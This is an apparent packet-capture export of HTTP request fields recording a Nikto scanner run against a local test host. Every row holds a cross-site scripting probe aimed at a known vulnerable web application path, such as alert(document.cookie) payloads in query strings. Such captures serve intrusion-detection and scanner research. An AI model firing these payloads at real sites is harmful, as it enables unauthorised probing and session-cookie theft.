http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									696						1	http://192.168.1.101/web/index.php?dir=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000713)				/web/index.php?dir=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									697						1	http://192.168.1.101/web/https-admserv/bin/index?/<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000714)				/web/https-admserv/bin/index?/<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									698						1	http://192.168.1.101/web/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000715)				/web/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									699						1	http://192.168.1.101/web/article.cfm?id=1'<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000716)				/web/article.cfm?id=1'<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									700						1	http://192.168.1.101/web/upload.php?type=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000717)				/web/upload.php?type=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									701						1	http://192.168.1.101/web/soinfo.php?\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000718)				/web/soinfo.php?\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									702						1	http://192.168.1.101/web/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000719)				/web/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
																	Keep-Alive										192.168.1.101									703						1	http://192.168.1.101/web/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000720)				/web/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									704						1	http://192.168.1.101/web/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000721)				/web/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
																	Keep-Alive										192.168.1.101									705						1	http://192.168.1.101/web/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000722)				/web/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
																	Keep-Alive										192.168.1.101									706						1	http://192.168.1.101/web/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000723)				/web/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
																	Keep-Alive										192.168.1.101									707						1	http://192.168.1.101/web/666%0a%0a<script>alert('Vulnerable');</script>666.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000724)				/web/666%0a%0a<script>alert('Vulnerable');</script>666.jsp
																	Keep-Alive										192.168.1.101									708						1	http://192.168.1.101/web/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000725)				/web/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									709						1	http://192.168.1.101/web/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000726)				/web/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									710						1	http://192.168.1.101/web/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000727)				/web/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									711						1	http://192.168.1.101/web/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000728)				/web/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									712						1	http://192.168.1.101/web/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000729)				/web/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									713						1	http://192.168.1.101/web/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000730)				/web/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									714						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>.shtm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000731)				/web/<script>alert('Vulnerable')</script>.shtm
																	Keep-Alive										192.168.1.101									715						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>.stm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000732)				/web/<script>alert('Vulnerable')</script>.stm
																	Keep-Alive										192.168.1.101									716						1	http://192.168.1.101/web/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000733)				/web/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									717						1	http://192.168.1.101/web/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000734)				/web/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									718						1	http://192.168.1.101/web/_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000735)				/web/_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									719						1	http://192.168.1.101/web/nosuchurl/><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000736)				/web/nosuchurl/><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									720						1	http://192.168.1.101/web/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000737)				/web/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
																	Keep-Alive										192.168.1.101									721						1	http://192.168.1.101/web/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000738)				/web/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
																	Keep-Alive										192.168.1.101									722						1	http://192.168.1.101/web/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000740)				/web/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
																	Keep-Alive										192.168.1.101									723						1	http://192.168.1.101/web/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000741)				/web/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									724						1	http://192.168.1.101/web/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000767)				/web/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null
																	Keep-Alive										192.168.1.101									725						1	http://192.168.1.101/web/~/<script>alert('Vulnerable')</script>.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000768)				/web/~/<script>alert('Vulnerable')</script>.aspx
																	Keep-Alive										192.168.1.101									726						1	http://192.168.1.101/web/~/<script>alert('Vulnerable')</script>.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000769)				/web/~/<script>alert('Vulnerable')</script>.asp
																	Keep-Alive										192.168.1.101									727						1	http://192.168.1.101/web/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000770)				/web/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
																	Keep-Alive										192.168.1.101									728						1	http://192.168.1.101/web/catinfo?<b>\">TESTING		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000771)				/web/catinfo?<b>\">TESTING
																	Keep-Alive										192.168.1.101									729						1	http://192.168.1.101/web/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000772)				/web/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									730						1	http://192.168.1.101/web/webamil/test.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000773)				/web/webamil/test.php
																	Keep-Alive										192.168.1.101									731						1	http://192.168.1.101/web/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000774)				/web/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									732						1	http://192.168.1.101/web/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000775)				/web/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
																	Keep-Alive										192.168.1.101									733						1	http://192.168.1.101/web/user.php?op=userinfo&uname=<script>alert('hi');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000776)				/web/user.php?op=userinfo&uname=<script>alert('hi');</script>
																	Keep-Alive										192.168.1.101									734						1	http://192.168.1.101/web/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000779)				/web/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									735						1	http://192.168.1.101/web/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000780)				/web/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									736						1	http://192.168.1.101/web/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000781)				/web/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									737						1	http://192.168.1.101/web/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000782)				/web/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
																	Keep-Alive										192.168.1.101									738						1	http://192.168.1.101/web/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000783)				/web/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
																	Keep-Alive										192.168.1.101									739						1	http://192.168.1.101/web/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000784)				/web/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
																	Keep-Alive										192.168.1.101									740						1	http://192.168.1.101/web/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000785)				/web/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									741						1	http://192.168.1.101/web/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000786)				/web/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
																	Keep-Alive										192.168.1.101									742						1	http://192.168.1.101/web/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000787)				/web/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									743						1	http://192.168.1.101/web/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000788)				/web/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
																	Keep-Alive										192.168.1.101									744						1	http://192.168.1.101/web/shop/normal_html.cgi?file=&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000789)				/web/shop/normal_html.cgi?file=&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;
																	Keep-Alive										192.168.1.101									745						1	http://192.168.1.101/web/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000790)				/web/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P
																	Keep-Alive		0	0	application/x-www-form-urlencoded						192.168.1.101									746						1	http://192.168.1.101/web/servlet/custMsg?guestName=<script>alert(\"Vulnerable\")</script>		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000791)				/web/servlet/custMsg?guestName=<script>alert(\"Vulnerable\")</script>
																	Keep-Alive		0	0	application/x-www-form-urlencoded						192.168.1.101									747						1	http://192.168.1.101/web/servlet/CookieExample?cookiename=<script>alert(\"Vulnerable\")</script>		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000792)				/web/servlet/CookieExample?cookiename=<script>alert(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									748						1	http://192.168.1.101/web/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000793)				/web/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									749						1	http://192.168.1.101/web/search/index.cfm?<script>alert(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000794)				/web/search/index.cfm?<script>alert(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									750						1	http://192.168.1.101/web/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000795)				/web/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									751						1	http://192.168.1.101/web/search.php?zoom_query=<script>alert(\"hello\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000796)				/web/search.php?zoom_query=<script>alert(\"hello\")</script>
																	Keep-Alive										192.168.1.101									752						1	http://192.168.1.101/web/search.php?searchstring=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000797)				/web/search.php?searchstring=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									753						1	http://192.168.1.101/web/search.php?searchfor=\"><script>alert(1776)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000798)				/web/search.php?searchfor=\"><script>alert(1776)</script>
																	Keep-Alive										192.168.1.101									754						1	http://192.168.1.101/web/search.asp?term=<%00script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000799)				/web/search.asp?term=<%00script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									755						1	http://192.168.1.101/web/script>alert('Vulnerable')</script>.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000800)				/web/script>alert('Vulnerable')</script>.cfm
																	Keep-Alive										192.168.1.101									756						1	http://192.168.1.101/web/samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000801)				/web/samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND
																	Keep-Alive										192.168.1.101									757						1	http://192.168.1.101/web/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000802)				/web/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000803)				/web/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									762						1	http://192.168.1.101/web/postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\"%3<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000804)				/web/postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\"%3<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									764						1	http://192.168.1.101/web/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000805)				/web/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									766						1	http://192.168.1.101/web/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000806)				/web/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
																	Keep-Alive										192.168.1.101									768						1	http://192.168.1.101/web/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000807)				/web/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
																	Keep-Alive										192.168.1.101									770						1	http://192.168.1.101/web/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000808)				/web/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
																	Keep-Alive										192.168.1.101									772						1	http://192.168.1.101/web/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000809)				/web/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									774						1	http://192.168.1.101/web/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000810)				/web/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]
																	Keep-Alive										192.168.1.101									775						1	http://192.168.1.101/web/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000811)				/web/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									776						1	http://192.168.1.101/web/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000812)				/web/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									777						1	http://192.168.1.101/web/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000813)				/web/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									778						1	http://192.168.1.101/web/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000814)				/web/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									779						1	http://192.168.1.101/web/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000815)				/web/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
																	Keep-Alive										192.168.1.101									780						1	http://192.168.1.101/web/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000816)				/web/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									781						1	http://192.168.1.101/web/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000817)				/web/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									782						1	http://192.168.1.101/web/phpimageview.php?pic=javascript:alert(8754)		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000818)				/web/phpimageview.php?pic=javascript:alert(8754)
																	Keep-Alive										192.168.1.101									783						1	http://192.168.1.101/web/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000819)				/web/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
